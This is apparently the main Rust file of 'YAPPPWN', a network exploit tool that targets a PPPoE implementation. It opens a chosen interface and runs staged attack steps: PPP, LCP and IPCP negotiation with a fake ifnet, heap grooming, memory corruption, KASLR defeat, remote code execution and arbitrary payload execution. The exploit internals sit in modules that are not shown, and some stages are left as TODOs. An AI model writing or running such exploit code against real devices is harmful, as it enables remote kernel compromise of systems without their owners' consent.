mod constants;
mod exploit;
mod parser;

use exploit::{Exploit, LcpEchoHandler};
use parser::{get_args, Args};
use pnet::datalink::{self, NetworkInterface};

fn run_exploit(interface_name: String) {
    // Find interface
    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(interface_names_match).unwrap();
    // Exploit
    let mut expl = Exploit {
        source_mac: [0, 0, 0, 0, 0, 0],
        target_mac: [0, 0, 0, 0, 0, 0],
        pppoe_softc: 0,
        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
        target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        source_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
    };
    // LCP
    let mut handler = exploit::LcpEchoHandler::new(&interface);
    handler.start();
    // Initial negotiations
    println!("[*] Starting Negotiations ...");
    expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] Initial Negotiations Done... Wait for interface to be ready");
    println!("[+] Starting Heap Grooming...");
    expl.heap_grooming(&interface);
    println!("[+] STAGE 1: Memory corruption");
    expl.memory_corruption(&interface);
    println!("[+] STAGE 2: KASLR defeat");
    expl.defeat_kaslr(&interface);
    println!("[+] STAGE 3: Remote code execution");
    expl.remote_code_exec(&interface); // TODO Add malicious LCP
    expl.ppp_negotiation(&interface, None);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] STAGE 4: Arbitrary payload execution");
    // expl.frag_and_send(&interface, stage2);
    handler.stop();
    println!("[+] DONE!");
}

fn main() {
    println!();
    println!("[+] YAPPPWN [+]");
    let args: Args = get_args();
    println!("{}", args);
    run_exploit(args.interface)
}
